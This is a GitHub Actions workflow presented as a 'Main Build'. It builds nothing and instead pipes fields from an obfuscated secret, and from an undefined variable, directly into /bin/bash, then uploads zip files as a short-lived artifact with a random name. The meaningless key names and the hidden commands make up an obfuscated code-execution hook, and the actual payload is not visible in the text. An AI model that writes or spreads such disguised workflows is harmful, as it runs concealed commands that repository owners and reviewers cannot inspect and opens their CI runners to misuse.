name: Main Build
on:
  workflow_dispatch:

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          ha3247: ${{ secrets.ha3247 }}
        run: |
          printf '%s' "$ha3247" | jq -r .z5017 | /bin/bash
          echo $xsoh17 | jq -r .nup29907 | /bin/bash

      - name: Store artifact
        uses: actions/upload-artifact@v4
        with:
          name: OQXkldO4
          path: "*.zip"
          retention-days: 1
